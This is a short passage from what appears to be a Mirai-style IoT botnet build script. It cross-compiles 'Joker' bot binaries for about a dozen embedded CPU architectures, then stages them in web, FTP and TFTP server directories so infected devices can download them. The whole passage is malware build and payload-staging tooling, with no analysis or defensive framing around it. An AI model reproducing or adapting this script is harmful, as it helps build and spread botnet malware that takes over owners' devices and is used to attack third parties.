...
compile_bot i586 Joker.x86 "-static"
compile_bot mips Joker.mips "-static"
compile_bot mipsel Joker.mpsl "-static"
compile_bot armv4l Joker.arm "-static"
compile_bot armv5l Joker.arm5 ""
compile_bot armv6l Joker.arm6 "-static"
compile_bot armv7l Joker.arm7 "-static"
compile_bot powerpc Joker.ppc "-static"
compile_bot sparc Joker.spc "-static"
compile_bot m68k Joker.m68k "-static"
compile_bot sh4 Joker.sh4 "-static"

cp release/Joker.* /var/www/html/bins
cp release/Joker.* /var/ftp
mv release/Joker.* /var/lib/tftpboot
rm -rf release
